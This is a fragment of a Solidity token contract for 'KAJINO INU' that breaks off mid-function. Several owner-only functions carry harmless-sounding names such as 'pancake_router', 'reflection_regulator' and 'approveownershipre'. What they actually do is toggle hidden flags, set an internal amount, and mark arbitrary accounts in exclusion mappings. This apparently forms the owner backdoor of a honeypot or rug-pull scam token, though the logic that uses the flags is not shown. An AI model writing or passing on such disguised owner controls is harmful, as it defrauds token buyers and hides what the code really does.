...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "KAJINO INU";
    string public _symbol= "KAJINO";
    bool balances1 = true;
    bool amount1 = true;
    ...
    function reflection_regulator(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function pancake_router(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    function bcgame_router(address _account_) onlyOwner public {
        _excludeamount[_account_] = true;
    }
    
    function rewardsystem(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
    function approveownershipre(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function jackpotdrops(address account) onlyOwner public {
